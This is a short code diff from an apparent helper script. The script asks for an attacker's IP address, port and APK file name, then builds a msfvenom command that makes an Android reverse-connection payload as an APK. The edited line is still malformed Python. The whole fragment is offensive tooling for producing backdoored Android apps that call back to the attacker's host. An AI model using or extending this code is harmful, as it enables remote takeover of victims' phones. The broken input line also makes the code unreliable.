@@ -10,7 +10,7 @@ os.system("ifconfig")
 print("select your inet-'ip address'.")
 lhost = input("Enter your ip address - ",)
 lport = input("Enter your port number - ",)
-apk_name = input("Enter apk name - ",,".apk")
+apk_name = input("Enter apk name - ",+".apk")
 msfvenom_sentence = "msfvenom -p "+ Android_payload+ " lhost"+"="+lhost+ " lport"+ "="+ lport+" R> "+apk_name
 
 def payload():
